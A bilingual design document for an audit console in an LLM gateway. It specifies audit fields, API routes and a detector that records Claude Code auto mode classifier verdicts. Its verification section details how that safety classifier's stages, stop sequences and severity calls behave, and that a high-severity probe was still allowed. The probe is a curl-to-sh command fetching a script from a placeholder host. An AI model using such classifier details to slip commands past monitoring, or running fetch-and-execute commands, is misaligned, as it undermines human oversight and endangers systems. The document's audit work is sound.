# Audit console design

<a href="#english"><img src="https://img.shields.io/badge/lang-English-blue.svg" alt="English"></a>
<a href="#korean"><img src="https://img.shields.io/badge/lang-한국어-red.svg" alt="Korean"></a>

---

<a id="english"></a>

# English

## Status and outcome

Proposed on 2026-10-29 against `main` at `443a683`. This is sub-project A of
the console work; sub-project B (OTel export dashboard and exporter/rule
editing) is separate. The four design sections were approved in review and the
UI follows the approved mockup
(<https://claude.ai/artifact/GS2uyuyFqd6ANciJpUmYHM>). Implementation starts
only after the written plan is approved. The decision record is
[ADR-057](../../decisions/ADR-057-audit-console-evidence.md).

The `mayu` admin console gains an **Audit** view for full administrators. It
answers four questions from the tamper-evident audit chain:

- What happened to one request: routing, every provider attempt, cost,
  privacy handling, denial reason (Traces, in the style of Langfuse).
- What one Claude Code session did: main, subagent, compaction and auxiliary
  calls in order (Sessions).
- What sensitive data was detected and how it was handled (PII).
- What was refused automatically: gateway policy denials (certain), and
  Claude Code auto mode classifier blocks (estimated, labelled as such)
  (Denials).

## Success criteria

On this EC2 development host, using a separate test `mayu` (the running
`mayu.service` is not touched):

1. A real Claude Code 2.1.312 session through the test gateway appears in the
   Sessions tab as one session, with main and subagent requests in order.
2. A request whose first target returns 503 shows two attempts in the trace
   waterfall; its audit record carries `attempts[]` and `fallback_used: true`.
3. A key with a 1 RPM limit produces a `key_rate_limited` row in Denials; the
   trace shows "denied before dispatch" and no attempts.
4. A privacy rule that masks email produces a PII row with category `email`
   and result "masked".
5. An audit file written by the current `main` binary still passes
   `mayu audit verify` after the upgrade, new records verify too, and boot
   replay projects the records still in that file into the console table,
   including denials written before the upgrade.
6. No raw Claude Code session ID appears in the audit file, `/metrics`, the
   process log or any admin API response.
7. Auto mode: if classifier calls reach the gateway (early verification 2), at
   least one verdict is recorded with its signature version. If they do not,
   the tab says "not observed" instead of showing zero blocks.
8. Repository gates pass: `go test ./... -race`, `go vet ./...`, `gofmt -l .`,
   `bash tests/run-all.sh`, `python3 scripts/check_docs_translations.py`.

## Decisions taken in review

1. **Approach:** extend the existing analytics index (derived, rebuildable)
   rather than scanning the WAL per query or adding a separate audit store.
2. **Evidence comes only from the audit chain.** Every row links to an audit
   record ID. Interpretation (`kind`) lives in the index and can be rebuilt.
3. **New audit fields** are append-only and `omitempty`:
   `attempts[]`, `client.request_class`, `client.session_ref`, `auto_mode`.
4. **Session digest is on by default** and can be turned off. It is scoped to
   the virtual key and never written to metrics or logs. This is an exception
   to a project rule and is recorded in ADR-057.
5. **Read-only admin API**, full-admin only, five endpoints.
6. **Actor** is the audit `key_id` plus a key-store lookup: key name and owner
   are labelled "per key store", the verified identity reference (when on) is
   labelled "audit record".
7. **Waterfall** is drawn from the new `attempts[]` field: one bar for gateway
   work, one bar per provider attempt, settlement, and the first-token mark.
8. **Kinds:** `ok`, `policy_denied`, `privacy_blocked`, `privacy_masked`,
   `privacy_internal`, `upstream_error`, `auto_mode_blocked`.
9. **Auto mode verdicts** are recorded only when the response matches Claude
   Code's own parser rule exactly. They are always shown as estimates.
10. **Bodies** stay behind ADR-018 capture; viewing goes through the existing
    `/admin/bodies/{ref}` and records `body_accessed`.

## Amendments during planning (2026-10-29)

Reading the code for the plan changed these points of the reviewed design:

1. Denials are `request_started` records with an outcome, which the existing
   `events` table never ingests. The console therefore gets its own
   `audit_events` table instead of new columns and a projection-version bump
   on `events`; Usage numbers do not change.
2. Messages, Chat and Invoke wrote no `latency`; every terminal record now
   carries it.
3. `auto_mode.verdict` may be `unknown` so the console can count block calls and
   server safeguards it could not read.
4. Keys have no name; the console shows `metadata.name` or the `key_id`.
5. A disabled index shows the standard enable card; the navigation stays.
6. The trace link template reaches the console through `/admin/capabilities`.
7. The view uses no browser storage (ADR-001).
8. Mode A has no rebuild endpoint; the lag hint says a restart replays.

## Current state

| Area | Today on `main` | Reference |
|---|---|---|
| Audit record | No attempt timing, no client context. `fallback_used` and `fallback_chain` are declared but never written (only the declaration matches `FallbackUsed`/`FallbackChain`). `trace_id` is written when a span context exists. | `internal/audit/record.go:50-56,110`; `internal/server/anthropicapi/messages.go:150` |
| Routing evidence | `routing.reason`, `privacy` (`block`, `internal_only`), `categories`, `policies[]{name,generation,rule}`, `masked`, `classifiers[]` | `internal/audit/routing.go:11-52`; `internal/router/request_routing.go:318,347` |
| Governance denials | Closed `audit.DenyReason` code in `outcome.error`; the policy name and rule are **not** recorded | `internal/audit/deny_reason.go`; `internal/governance/governance.go:306-312` |
| Fallback loop | Each attempt already derives a context with `audit.WithRoutingAttempt` | `internal/server/anthropicapi/messages.go:346-411` |
| Analytics index | SQLite `events` (Mode A) and Postgres (Mode B). Version-1 rows are first-write-wins (`WHERE events.projection_version=0`). Boot replay reads each configured file sink. | `internal/analytics/index.go:24-60,186-198,247`; `internal/analytics/pgstore/pgstore.go:21-65`; `cmd/mayu/gateway.go:247-262` |
| Admin API | `/admin/logs`, `/admin/analytics/*`, `/admin/bodies/`, `/admin/audit/verify` (on-demand chain check, 16 MiB cap) | `internal/server/server.go:413-438,510`; `internal/server/auditapi/auditapi.go` |
| Console | Dependency-free `app.js`, `evaluation.js`, `i18n.js` (en/ko/zh/ja); Node and Playwright checks in `testdata/` | `internal/server/adminui/static/`, `internal/server/adminui/testdata/` |
| Claude Code headers | The 2.1.312 binary defines `X-Claude-Code-Session-Id` and `x-claude-code-request-class` with classes `main`, `subagent`, `workflow`, `compaction`, `auxiliary`, `side_reply`. Early verification showed `x-claude-code-request-class` is not sent in any mode while `X-Claude-Code-Session-Id` is sent in all three (see "Early verification results"). | `strings` on `~/.local/share/claude/versions/2.1.312` |

## Architecture

```
client ──► ingress (messages · chat · invoke/converse · responses)
            │  ClientRef from headers (class allow-list, key-scoped session digest)
            │  attempt recorder in the request context
            ▼
         fallback loop ── Begin/End per provider attempt ──► AttemptRef[]
            │
            ▼  Claude-format response only (rules: Resulting decisions)
         auto mode detector (bounded text tap, exact parser rule)
            │
            ▼
         request_completed record  (+attempts, +client, +auto_mode,
            │                        fallback_used/fallback_chain filled)
            ▼
         audit writer ─► file sink (hash chain) ─► analytics sink
                                                   audit_events:
                                                   kind, key_id, codes, class,
                                                   session, timings, record_json
                                                   + audit_event_categories
            ▼
         /admin/audit/{events,sessions,summary}  (full-admin, read-only)
            ▼
         console: Audit view (Traces · Sessions · PII · Denials)
```

## Components

### Audit record additions (`internal/audit`)

All new fields are appended after `GuardrailVersion` with `omitempty`, so a
record without them marshals to exactly the bytes it had before.

```go
type AttemptRef struct {
    Provider string `json:"provider"`          // configured provider name, never a URL
    Model    string `json:"model"`
    Status   string `json:"status"`            // ok | upstream_error | timeout | model_not_found | stream_failed | canceled
    HTTP     int    `json:"http,omitempty"`
    StartMs  int64  `json:"start_ms"`          // offset from request start
    DurMs    int64  `json:"dur_ms"`
}
type ClientRef struct {
    RequestClass string `json:"request_class,omitempty"` // closed set, else omitted
    SessionRef   string `json:"session_ref,omitempty"`   // "s1:" + 32 hex
}
type AutoModeRef struct {
    Verdict   string `json:"verdict"`   // block | allow | unknown (block call or server safeguard, not parsed)
    Stage     string `json:"stage"`     // s1 | s2 | server
    Signature string `json:"signature"` // e.g. "claude-code-2.1"
}
// Record gains, at the END:
//   Attempts []AttemptRef `json:"attempts,omitempty"`
//   Client   *ClientRef   `json:"client,omitempty"`
//   AutoMode *AutoModeRef `json:"auto_mode,omitempty"`
```

- `attempts` holds at most 8 entries (longer chains keep the first 7 and the
  last). Only the `request_completed` record carries it.
- When `attempts` has more than one entry, `outcome.fallback_used` becomes
  `true` and `outcome.fallback_chain` lists the attempted providers in order.
  Both fields are already part of the documented wire shape; until now they
  were never set. Older records are unchanged.
- Every terminal record (completed, or started with an outcome) gets
  `latency{total_ms, ttft_ms}` measured from the request start, and `client`.
  Before this change only the Responses path wrote `latency`
  (`internal/server/responsesapi/observe.go:119`).
- A context helper owns the attempt list: `audit.WithAttemptLog(ctx)`,
  `audit.BeginAttempt(ctx, provider, model) func(status string, http int)`,
  `audit.AttemptsFrom(ctx)`. The list is safe for concurrent use and copied
  when the record is built, like `RoutingFrom`.

### Request-path capture (`internal/server`, all ingress packages)

- **Client context.** One helper, `clientctx.FromRequest(r, keyID, mode)`,
  reads the two headers on every ingress. `request_class` is kept only if it is
  one of the six known classes. The session ID is accepted only if it is 1–128
  bytes of `[A-Za-z0-9._:-]`; then
  `session_ref = "s1:" + hex(sha256("inferplane-session-v1\x00" + key_id + "\x00" + id)[:16])`.
  Anything else yields no `session_ref`. The raw value is never stored, logged
  or labelled.
- **Attempts.** Each fallback loop (Messages, Chat, Invoke, Converse,
  Responses) calls `BeginAttempt` before dispatch and ends it with a closed
  status. Requests denied before dispatch have no attempts.
- **Auto mode detector.** Runs only for Anthropic Messages-format responses
  (Messages and Invoke ingress) and when the detector is enabled. It reads at
  most the first 16 KiB of assistant text (non-streaming body, or text deltas
  for a stream), stores no text, and never changes the response bytes. What it
  records is fixed by "Resulting decisions" in "Early verification results".
  Block calls and server safeguards that do not parse unambiguously increment
  `inferplane_audit_auto_mode_unparsed_total` (no labels) and are recorded with
  `verdict: unknown`. `</severity>` calls and reasoning replies ending in
  `<severity>` are neither recorded nor counted.

### Configuration

```json
"audit": {
  "client_evidence": { "session_ref": "key_scoped", "auto_mode": "on" }
},
"otel": { "trace_link_template": "https://grafana.example/explore?traceId={trace_id}" }
```

- `session_ref`: `key_scoped` (default when the block is absent) or `off`.
- `auto_mode`: `on` (default) or `off`.
- `trace_link_template`: optional. `config validate` rejects anything that is
  not `http`/`https` or lacks `{trace_id}`. `/admin/capabilities` carries it;
  the console fills in a 32-hex `trace_id` and opens it in a new tab. CSP
  does not change.

### Audit event projection (`internal/analytics`, `pgstore`)

The console reads a new table, `audit_events`, in the same analytics index
(SQLite in Mode A, Postgres in Mode B). The existing `events` table and the
Usage views keep their meaning.

- **Which records:** every terminal request record: `request_completed`, and
  `request_started` that carries an `outcome`. Every gateway denial is written
  the second way (`internal/server/anthropicapi/messages.go:736-753`), and
  `events` never sees it because `analytics.Observable` accepts only
  `request_completed` (`internal/analytics/evidence.go:32`). Admitted
  `request_started` records and admin events are skipped.
- **Columns:** `id`, `ts`, `ts_ms`, `event`, `kind`, `team`, `key_id`,
  `ingress`, `stream`, `status`, `deny_code`, `routing_reason`, `privacy`,
  `masked`, `would_restrict`, `pii`, `policy_ref`, `planned_boundary`,
  `actual_boundary`, `request_class`, `session_ref`, `trace_id`,
  `model_requested`, `model_actual`, `provider`, `fallback`, `attempt_count`,
  `auto_verdict`, `auto_stage`, `auto_signature`, `input_tokens`,
  `output_tokens`, `cost_micros`, `total_ms`, `ttft_ms`, `has_body`,
  `record_json`. Table `audit_event_categories(id, category)`. Indexes on
  `ts_ms`, `(kind, ts_ms)`, `(key_id, ts_ms)`, `(session_ref, ts_ms)`.
- **Idempotent:** keyed by the record ULID with `ON CONFLICT DO NOTHING`.
- **Coverage:** Mode A fills the table from the live audit sink and, at boot,
  by replaying each configured file sink. Records no longer in any file sink
  never enter the table, so the console shows the oldest covered time instead
  of claiming completeness. Mode B fills it from the audit segments its
  aggregator already reads.
- `record_json` is the exact audit line. It feeds the detail view so the view
  survives audit-file rotation; tampering with this copy is detectable with
  `mayu audit verify` against the chain.
- **Kind derivation** (first match wins):
  1. `auto_mode_blocked`: `auto_mode.verdict == block`
  2. `privacy_blocked`: status ≥ 400 and (`routing.privacy == block`, or
     the code (`outcome.error`, else `routing.reason`) is one of
     `sensitive_blocked`, `mask_failed`, `masking_failed`)
  3. `policy_denied`: status ≥ 400 and the code is an `audit.DenyReason`
     value or one of `model_forbidden`, `no_safe_route`,
     `budget_target_changed`, `budget_authority_unavailable`
  4. `upstream_error`: any other status ≥ 400, or `partial`. This also
     covers gateway-side request errors such as a context overflow, so the
     console labels this kind “Error”, not “Upstream error”.
  5. `privacy_masked`: `routing.masked` or legacy `request.pii_masked`
  6. `privacy_internal`: `routing.privacy == internal_only`
  7. `ok`
- `events.error_code` keeps its meaning; `audit_events.deny_code` is separate.

### Admin API (`internal/server/auditconsoleapi`, mounted with analytics)

All routes: `AdminAuth` + `requireAdmin`. Mounted only when the analytics index
is on; `/admin/capabilities` gains `audit_console: bool` and
`trace_link_template` (empty when unset).

| Route | Purpose |
|---|---|
| `GET /admin/audit/events` | Filters: `kind` (comma list), `team`, `key_id`, `model`, `provider`, `code`, `category`, `class`, `session`, `trace_id`, `since`, `until` (RFC 3339, default last 24 h, max 366 days). `limit` ≤ 200, `before` = id keyset. |
| `GET /admin/audit/events/{id}` | Summary row, the stored audit record, and derived waterfall rows |
| `GET /admin/audit/sessions` | Session list: first/last time, requests, cost, denials, PII, auto mode blocks, subagent count |
| `GET /admin/audit/sessions/{ref}` | Requests of one session in time order, `limit` ≤ 500 with keyset |
| `GET /admin/audit/summary` | Counts by kind, top PII categories, PII handling, denial codes with scope and last time, auto mode verdicts/blocks/unparsed, 12 time buckets per card |

- Invalid parameters return `400` with one of `invalid_kind`, `invalid_limit`,
  `invalid_cursor`, `invalid_range`, `invalid_filter`.
- An ID that is not in the console table returns `404 not_found`.
- String fields come from closed sets or from the audit record itself; no
  raw session ID, secret or key plaintext exists to return.
- Policy name and rule appear for routing denials (they are in
  `routing.policies`). Governance denials show the code and its scope (team,
  key, user) only, because the audit record has no policy name for them.

### Console (`internal/server/adminui`)

- New `static/audit.js` (same pattern as `evaluation.js`), nav item **Audit**
  after **Logs**, i18n keys in all four languages, styles in `style.css`.
  No Observability placeholder is added; sub-project B adds its own item.
- Header: period, team, key filters (keys have no name field; the console
  shows `metadata.name` when set, otherwise the `key_id`), index freshness from `/admin/analytics/health`,
  and a "verify chain" button that calls the existing `/admin/audit/verify`.
- Cards: requests, policy denials, PII detections, auto mode blocks
  (dashed "estimate" badge), each with a 12-bucket sparkline.
- Tabs as in the mockup: Traces (kind chips, table, detail), Sessions, PII,
  Denials. Certain evidence uses solid badges; estimates use dashed badges.
- Detail: waterfall, actor (audit record vs. key store badges, link to the key
  in Virtual keys), session, provider, tokens, cost, privacy/denial evidence,
  auto mode verdict, body button (only when `body_ref` and bodies are on),
  `trace_id` with the optional external link, `hash`/`prev_hash` shown as
  chain position, never as "verified".
- Empty and degraded states: index off (the view shows the enable card, like
  other sections), index lag banner (Mode A: a restart replays the file sink;
  Mode B: rebuild), coverage start, key no longer in the key
  store, body expired or capture off, auto mode not observed, signature
  mismatch warning when unparsed block calls or safeguards rise. The view keeps
  nothing in browser storage (ADR-001 data-free console).

## Security and privacy

| Topic | Rule |
|---|---|
| Session ID | Digest only, key-scoped, domain-separated; never in metrics, logs or API output; `off` switch |
| Linkability | A digest links requests of one session under one key. It is evidence for audit, never authorization |
| Auto mode | Verdict, stage and signature only; response text is not stored |
| Attempts | Provider names and closed statuses; no URLs, no upstream error text |
| Access | Full-admin only; team-mapped admins get 403 and an `admin_denied` record |
| Bodies | Unchanged ADR-018 path with `body_accessed` |
| Metrics | One new unlabelled counter; no `key_id`, session or identity labels |

## Testing

- **Audit:** golden tests that a record without the new fields is byte-identical
  before and after; chains mixing old and new records verify;
  `fallback_used`/`fallback_chain` follow `attempts`.
- **Ingress (all five paths):** 503→200 fallback yields two attempts; denial
  before dispatch yields none; the same session ID under two keys yields two
  refs; class values outside the set are dropped; the raw session ID never
  appears in the audit line, `/metrics` or captured logs.
- **Auto mode detector:** table tests for the block call (stage `s1`), the server
  safeguard (stage `server`, including unknown status or outcome and empty
  `tool_uses`), the auxiliary-only full rule (stage `s2`), `</severity>` and
  `<severity>` replies never recorded, `<block>` inside `<thinking>`,
  conflicting blocks, wrong stop sequence, streamed deltas, the 16 KiB bound,
  requests without the class header. Fixtures come from
  a real 2.1.312 capture with secrets removed.
- **Index:** replay projects completed and denied records, re-ingest is
  idempotent, kind table, categories table, SQLite always; Postgres when `INFERPLANE_TEST_PG_DSN` is set.
- **Admin API:** filters, keyset paging, 400 codes, 404 for unknown IDs,
  401/403, capability flag.
- **Console:** Node checks in `testdata/audit_console.cjs` (rendering rules,
  badges, empty states), i18n key parity in `adminui_test.go`, Playwright QA
  at 1280 px and 390 px (no horizontal overflow, no console errors).
- **Live, this EC2:** test `mayu` on another port with a test config; real
  Claude Code in Bedrock and Anthropic mode with auto mode; a local stub
  provider that returns 503 first; a 1 RPM key; a masking privacy rule;
  Playwright against the test console.

## Early verification items

1. Does Claude Code 2.1.312 send `X-Claude-Code-Session-Id` and
   `x-claude-code-request-class` to a custom base URL in Bedrock mode and in
   Anthropic mode? (Capture at the test gateway.) If not in a mode, Sessions and
   class data are unavailable for that mode and the UI says so.
2. What do auto mode classifier calls look like in 2.1.312: streaming or not,
   stop sequences, how stages differ? Which main models use the server-side
   verdict instead (those sessions produce no classifier calls)?
3. Does a server-side verdict appear in the main InvokeModel response in a
   stable, parseable form? If yes, the plan may add stage `server`; if not,
   the limit is documented.

## Early verification results (2026-10-29)

Captured with Claude Code 2.1.312 (`--permission-mode auto -p`, one shell
command) through a relay in front of a throwaway gateway. Modes: (a) Bedrock
with a Claude main model, (b) Bedrock with a non-Claude main model (`kimi-k3`),
(c) Anthropic mode (`global.anthropic.claude-sonnet-5`).

- `X-Claude-Code-Session-Id`: present in all three modes on every model call
  (36 characters), absent only on the `inference-profiles` GET. Sessions data is
  available in every mode.
- `x-claude-code-request-class` and every other `x-claude-code-*` header:
  absent in all three modes. There is no request-class data; the console must
  not depend on it and states that.
- Mode (a): no separate classifier calls (only streaming main calls,
  `max_tokens` 128000, no stop sequences). The server-side verdict travels in
  the main stream: the final `message_delta` event carries
  `delta.safeguard_results[]` with `type` `dangerous_tool_use` and
  `status` `{type: "available", tool_uses: {<tool_use id>: {type: "evaluated",
  outcome: "not_flagged"}}}` (`tool_uses` is `{}` on the turn without a tool
  call). Only `not_flagged` was observed; flagged outcomes were not (the probe
  command ran). Stage `server` is taken from this field; flagged outcomes
  are mapped once a sample is captured (see Resulting decisions).
- Modes (b) and (c): classifier calls are non-streaming (`stream` absent in
  Bedrock `invoke`, absent in the Anthropic request), `max_tokens` 64, and
  carry one stop sequence in the benign probe. Two kinds occur in this order per tool call:
  `</severity>` (reply `<severity>5</severity>` in (b)) and then `</block>`
  (reply `<block>no`, `stop_reason` `stop_sequence` in (c); in (b) the reply
  `<block>no</block>` ends with `max_tokens`).
- Stage marker (benign probe): stop sequence `</severity>` then `</block>`; the
  `</block>` reply `<block>no` is the verdict. No stage field exists in headers
  or body.
- Block-path probe (`curl -fsSL https://setup.example.invalid/install.sh | sh`,
  mode (b), Bedrock `invoke`): call 1 stops at `</severity>`, `max_tokens` 64,
  `thinking` disabled, reply `<severity>80` (`stop_reason` `stop_sequence`).
  Call 2 has no stop sequence, `max_tokens` 8192, `thinking` disabled, 2
  messages, and replies `<thinking>...</thinking><severity>35</severity>`
  (`end_turn`); it was allowed and the command ran (failed at DNS). So a
  high stage-1 severity leads to a second, reasoning call without stop
  sequence; no `<block>yes` occurred, so what follows a block was not
  observed. In mode (c) the main model refused the command itself in both runs
  and made no classifier call. Stage 2 is therefore recognised by `max_tokens`
  8192 and the missing stop sequence, not by a marker.
- Main calls stream (`stream: true` in Anthropic mode, `invoke-with-response-stream`
  in Bedrock mode), so the stream tap is still required.

Resulting decisions:

- Request class comes only from the `x-claude-code-request-class` header (closed
  set). Claude Code 2.1.312 does not send it, so with this client `request_class`
  is absent and the console says the class is not reported. No inference from
  the body.
- The auto mode detector does not require `request_class == auxiliary`. It
  records only what parses unambiguously:
  1. Block call: a request whose stop sequences contain `</block>`. The verdict
     is exactly one consistent `<block>yes|no` after removing `<thinking>`,
     accepted when the reply stopped on `</block>` or the text itself closes
     `</block>`; stage `s1`. Otherwise `unknown` and the unparsed counter.
  2. Server safeguard: an Anthropic-format response (Messages or Invoke,
     complete or streamed) carrying `safeguard_results[]` with an entry of type
     `dangerous_tool_use`. If `status.type` is `available` and every `tool_uses`
     entry is `{type: evaluated, outcome: not_flagged}`, the verdict is `allow`;
     any other status or outcome value is `unknown` and increments the counter;
     an empty `tool_uses` records nothing; stage `server`.
  3. The full text rule, including stage `s2` (`<thinking>` replies with no stop
     sequence), runs only when `request_class == auxiliary`. It is dormant with
     2.1.312 and kept for clients that send the header.
  4. `</severity>` calls and reasoning replies that end in `<severity>` are never
     recorded: they carry no block decision and the threshold is unknown.
  The signature stays `claude-code-2.1` for all three. With 2.1.312, mode (b)
  high-severity blocks and any real server `flagged` outcome appear only as
  `unknown` (plus the counter) until a captured sample maps them.
- Stage values are `s1`, `s2`, `server`; the earlier `fast` placeholder is dropped.

## Out of scope

- Sub-project B: OTel export dashboard, exporter and rule editing.
- Policy name and rule for governance denials (needs a new governance field).
- Team-scoped admin views; external backend queries; per-record chain proof.
- Linking subagents to their parent agent (`x-claude-code-agent-id`).
- Index retention policy.

---

<a id="korean"></a>

# 한국어

## 상태와 결과

2026-10-29에 `main` `443a683` 기준으로 제안합니다. 콘솔 작업의 하위 프로젝트
A입니다. 하위 프로젝트 B(OTel 내보내기 대시보드, exporter·규칙 편집)는 따로
진행합니다. 설계 네 섹션은 검토에서 승인되었고, UI는 승인된 목업
(<https://claude.ai/artifact/GS2uyuyFqd6ANciJpUmYHM>)을 따릅니다. 구현은 작성된
계획이 승인된 뒤 시작합니다. 결정 기록은
[ADR-057](../../decisions/ADR-057-audit-console-evidence.md)입니다.

`mayu` 관리 콘솔에 full-admin용 **감사** 화면이 생깁니다. 위변조 감지 감사 체인을
근거로 네 가지 질문에 답합니다.

- 요청 하나에 무슨 일이 있었나: 라우팅, 모든 provider 시도, 비용, PII 처리,
  거부 이유(Traces, Langfuse 형태)
- Claude Code 세션 하나가 무엇을 했나: main, subagent, compaction, auxiliary
  호출을 시간순으로(세션)
- 어떤 민감 정보가 탐지되었고 어떻게 처리되었나(PII)
- 무엇이 자동으로 거부되었나: gateway 정책 거부(확정)와 Claude Code auto mode
  분류기 차단(추정, 추정으로 표시)(거부 이력)

## 성공 기준

이 EC2 개발 호스트에서 별도의 테스트 `mayu`로 확인합니다(운영 중인
`mayu.service`는 건드리지 않습니다).

1. 테스트 gateway를 거친 실제 Claude Code 2.1.312 세션이 세션 탭에 한 세션으로
   나오고, main과 subagent 요청이 시간순으로 보입니다.
2. 첫 대상이 503을 돌려준 요청은 waterfall에 시도 2개가 보이고, 감사 기록에
   `attempts[]`와 `fallback_used: true`가 남습니다.
3. RPM 1인 키는 거부 이력에 `key_rate_limited` 행을 만들고, trace에는 "dispatch
   전 거부"와 시도 0개가 보입니다.
4. email을 마스킹하는 privacy 규칙은 category `email`, 결과 "마스킹"인 PII 행을
   만듭니다.
5. 현재 `main` 바이너리가 쓴 감사 파일이 업그레이드 뒤에도 `mayu audit verify`를
   통과하고, 새 기록도 통과하며, 부팅 replay가 그 파일에 남은 기록(업그레이드 전에
   기록된 거부 포함)을 콘솔 표로 투영합니다.
6. Claude Code 세션 ID 원문이 감사 파일, `/metrics`, 프로세스 로그, admin API
   응답 어디에도 나오지 않습니다.
7. auto mode: 분류기 호출이 gateway에 오면(먼저 확인할 항목 2) 판정이 최소 1건
   서명 버전과 함께 기록됩니다. 오지 않으면 탭에 차단 0건 대신 "관측 안 됨"이
   나옵니다.
8. 저장소 게이트 통과: `go test ./... -race`, `go vet ./...`, `gofmt -l .`,
   `bash tests/run-all.sh`, `python3 scripts/check_docs_translations.py`.

## 검토에서 정한 결정

1. **접근:** 질의마다 WAL을 읽거나 감사 전용 저장소를 새로 두지 않고, 기존
   analytics 인덱스(파생, 재구성 가능)를 확장합니다.
2. **근거는 감사 체인뿐입니다.** 모든 행은 감사 기록 ID로 이어집니다. 해석
   (`kind`)은 인덱스에 두고 다시 만들 수 있습니다.
3. **새 감사 필드**는 append-only, `omitempty`입니다: `attempts[]`,
   `client.request_class`, `client.session_ref`, `auto_mode`.
4. **세션 digest는 기본으로 켜고** 끌 수 있습니다. 가상 키 범위이고 metrics와
   로그에는 쓰지 않습니다. 프로젝트 규칙의 예외라 ADR-057에 기록합니다.
5. **읽기 전용 admin API**, full-admin 전용, 엔드포인트 5개입니다.
6. **행위자**는 감사의 `key_id`와 키 저장소 조회입니다. 키 이름과 owner에는
   "키 저장소 기준", verified identity 참조(켜진 경우)에는 "감사 기록"을 붙입니다.
7. **waterfall**은 새 `attempts[]`로 그립니다. gateway 처리 막대 하나, provider
   시도마다 막대 하나, 정산, 첫 토큰 표시입니다.
8. **kind:** `ok`, `policy_denied`, `privacy_blocked`, `privacy_masked`,
   `privacy_internal`, `upstream_error`, `auto_mode_blocked`.
9. **auto mode 판정**은 응답이 Claude Code 자체 파서 규칙과 정확히 맞을 때만
   기록하고, 항상 추정으로 표시합니다.
10. **본문**은 ADR-018 캡처를 그대로 따릅니다. 열람은 기존
    `/admin/bodies/{ref}`를 거치고 `body_accessed`를 남깁니다.

## 계획 중 바뀐 점 (2026-10-29)

계획을 쓰며 코드를 읽은 결과, 검토한 설계에서 다음을 바꿨습니다.

1. 거부는 outcome이 붙은 `request_started` 기록이고, 기존 `events` 표는 이것을
   수집하지 않습니다. 그래서 `events`에 열을 더하고 projection 버전을 올리는 대신
   콘솔 전용 `audit_events` 표를 둡니다. 사용량 수치는 바뀌지 않습니다.
2. Messages, Chat, Invoke는 `latency`를 기록하지 않았습니다. 이제 요청의 마지막
   기록에는 모두 붙습니다.
3. 콘솔이 해석하지 못한 block 호출과 서버 safeguard 수를 셀 수 있도록 `auto_mode.verdict`에
   `unknown`을 둡니다.
4. 키에는 이름이 없으므로 콘솔은 `metadata.name` 또는 `key_id`를 보여줍니다.
5. 인덱스가 꺼져 있으면 표준 활성화 안내 카드를 보여주고, 메뉴는 그대로 둡니다.
6. trace 링크 템플릿은 `/admin/capabilities`로 콘솔에 전달합니다.
7. 이 화면은 브라우저 저장소를 쓰지 않습니다(ADR-001).
8. Mode A에는 rebuild 엔드포인트가 없으므로, 지연 안내는 재시작하면 replay된다고
   알려 줍니다.

## 현재 상태

| 영역 | 지금 `main` | 근거 |
|---|---|---|
| 감사 기록 | 시도별 시간·클라이언트 정보가 없습니다. `fallback_used`, `fallback_chain`은 선언만 있고 어디서도 쓰지 않습니다(`FallbackUsed`/`FallbackChain` 검색 결과가 선언뿐). `trace_id`는 span context가 있을 때 기록됩니다. | `internal/audit/record.go:50-56,110`; `internal/server/anthropicapi/messages.go:150` |
| 라우팅 근거 | `routing.reason`, `privacy`(`block`, `internal_only`), `categories`, `policies[]{name,generation,rule}`, `masked`, `classifiers[]` | `internal/audit/routing.go:11-52`; `internal/router/request_routing.go:318,347` |
| 거버넌스 거부 | `outcome.error`에 닫힌 `audit.DenyReason` 코드만 있고, 정책 이름과 rule은 **기록되지 않습니다** | `internal/audit/deny_reason.go`; `internal/governance/governance.go:306-312` |
| fallback 루프 | 시도마다 `audit.WithRoutingAttempt`로 context를 새로 만듭니다 | `internal/server/anthropicapi/messages.go:346-411` |
| analytics 인덱스 | SQLite `events`(Mode A)와 Postgres(Mode B). 버전 1 행은 first-write-wins(`WHERE events.projection_version=0`). 부팅 replay는 설정된 file sink를 읽습니다. | `internal/analytics/index.go:24-60,186-198,247`; `internal/analytics/pgstore/pgstore.go:21-65`; `cmd/mayu/gateway.go:247-262` |
| admin API | `/admin/logs`, `/admin/analytics/*`, `/admin/bodies/`, `/admin/audit/verify`(즉시 체인 검사, 16 MiB 상한) | `internal/server/server.go:413-438,510`; `internal/server/auditapi/auditapi.go` |
| 콘솔 | 의존성 없는 `app.js`, `evaluation.js`, `i18n.js`(en/ko/zh/ja). `testdata/`에 Node·Playwright 검사 | `internal/server/adminui/static/`, `internal/server/adminui/testdata/` |
| Claude Code 헤더 | 2.1.312 바이너리에 `X-Claude-Code-Session-Id`와 `x-claude-code-request-class`가 있고, class는 `main`, `subagent`, `workflow`, `compaction`, `auxiliary`, `side_reply`입니다. 먼저 확인한 결과, `x-claude-code-request-class`는 어떤 모드에서도 오지 않고 `X-Claude-Code-Session-Id`는 세 모드 모두에서 옵니다("먼저 확인한 결과" 참고). | `~/.local/share/claude/versions/2.1.312` 문자열 검사 |

## 구조

```
client ──► ingress (messages · chat · invoke/converse · responses)
            │  헤더에서 ClientRef (class 허용 목록, 키 범위 세션 digest)
            │  요청 context에 시도 기록기
            ▼
         fallback 루프 ── provider 시도마다 Begin/End ──► AttemptRef[]
            │
            ▼  Claude 형식 응답만 (규칙: 그에 따른 결정)
         auto mode 판정기 (크기 제한 텍스트 탭, 정확한 파서 규칙)
            │
            ▼
         request_completed 기록 (+attempts, +client, +auto_mode,
            │                    fallback_used/fallback_chain 채움)
            ▼
         감사 writer ─► file sink (hash chain) ─► analytics sink
                                                  audit_events:
                                                  kind, key_id, 코드, class,
                                                  세션, 시간, record_json
                                                  + audit_event_categories
            ▼
         /admin/audit/{events,sessions,summary}  (full-admin, 읽기 전용)
            ▼
         콘솔: 감사 화면 (Traces · 세션 · PII · 거부 이력)
```

## 구성 요소

### 감사 기록 추가 (`internal/audit`)

새 필드는 모두 `GuardrailVersion` 뒤에 `omitempty`로 붙입니다. 새 필드가 없는
기록은 이전과 똑같은 바이트로 직렬화됩니다.

```go
type AttemptRef struct {
    Provider string `json:"provider"`          // 설정의 provider 이름, URL은 쓰지 않음
    Model    string `json:"model"`
    Status   string `json:"status"`            // ok | upstream_error | timeout | model_not_found | stream_failed | canceled
    HTTP     int    `json:"http,omitempty"`
    StartMs  int64  `json:"start_ms"`          // 요청 시작 기준 오프셋
    DurMs    int64  `json:"dur_ms"`
}
type ClientRef struct {
    RequestClass string `json:"request_class,omitempty"` // 닫힌 집합, 그 밖의 값은 생략
    SessionRef   string `json:"session_ref,omitempty"`   // "s1:" + hex 32자
}
type AutoModeRef struct {
    Verdict   string `json:"verdict"`   // block | allow | unknown (block 호출 또는 서버 safeguard, 해석 불가)
